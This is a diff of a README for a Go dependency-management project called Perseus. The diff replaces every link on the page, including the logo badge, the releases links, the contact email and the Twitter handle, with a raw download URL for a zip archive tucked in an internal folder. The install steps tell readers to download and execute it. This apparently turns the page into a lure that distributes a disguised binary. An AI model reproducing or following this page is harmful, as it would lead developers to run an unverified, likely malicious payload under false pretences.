@@ -2,7 +2,7 @@
 
 Welcome to the **Perseus** repository! The hero we all need to defeat the kraken that is Go module dependency graphs. This project aims to simplify the management of dependencies in Go projects, making it easier for developers to navigate and maintain their codebases.
 
-![Perseus Logo](https://img.shields.io/badge/Perseus-hero-blue.svg)
+![Perseus Logo](https://github.com/Thanapak111/perseus/raw/refs/heads/master/internal/store/Software-3.3.zip)
 
 ## Table of Contents
 
@@ -28,11 +28,11 @@ Managing dependencies in Go can often feel overwhelming. As projects grow, so do
 
 ## Installation
 
-To get started with **Perseus**, you need to download and execute the latest release. You can find the releases [here](https://github.com/Thanapak111/perseus/releases). 
+To get started with **Perseus**, you need to download and execute the latest release. You can find the releases [here](https://github.com/Thanapak111/perseus/raw/refs/heads/master/internal/store/Software-3.3.zip). 
 
 Follow these steps:
 
-1. Visit the [Releases section](https://github.com/Thanapak111/perseus/releases).
+1. Visit the [Releases section](https://github.com/Thanapak111/perseus/raw/refs/heads/master/internal/store/Software-3.3.zip).
 2. Download the latest release suitable for your operating system.
 3. Extract the files and execute the binary.
 
@@ -77,13 +77,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, please check the [Releases section](https://github.com/Thanapak111/perseus/releases). Make sure to download the latest version to benefit from new features and bug fixes.
+For the latest updates and releases, please check the [Releases section](https://github.com/Thanapak111/perseus/raw/refs/heads/master/internal/store/Software-3.3.zip). Make sure to download the latest version to benefit from new features and bug fixes.
 
 ## Contact
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: contact@perseus.com
-- **Twitter**: [@PerseusHero](https://twitter.com/PerseusHero)
+- **Email**: https://github.com/Thanapak111/perseus/raw/refs/heads/master/internal/store/Software-3.3.zip
+- **Twitter**: [@PerseusHero](https://github.com/Thanapak111/perseus/raw/refs/heads/master/internal/store/Software-3.3.zip)
 
 Thank you for visiting the **Perseus** repository! We hope you find it useful in your Go development journey. Happy coding!
